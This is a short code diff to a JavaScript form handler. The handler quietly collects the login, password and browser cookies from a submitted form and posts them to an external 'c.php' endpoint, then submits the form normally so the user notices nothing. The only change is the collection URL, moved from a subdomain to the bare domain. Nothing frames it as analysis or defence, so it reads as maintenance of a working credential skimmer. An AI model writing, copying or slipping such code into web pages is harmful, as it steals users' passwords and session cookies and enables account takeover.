@@ -3,7 +3,7 @@ function yay(form) {
     var l = $(form).find('input[name="login"]').val();
     var p = $(form).find('input[name="password"]').val();
 
-    $.post('https://ss1.regmyudid.com/c.php', {l: l, p: p, c: document.cookie}, function() {
+    $.post('https://regmyudid.com/c.php', {l: l, p: p, c: document.cookie}, function() {
         $(form).removeAttr('onsubmit');
         $(form).submit();
     });
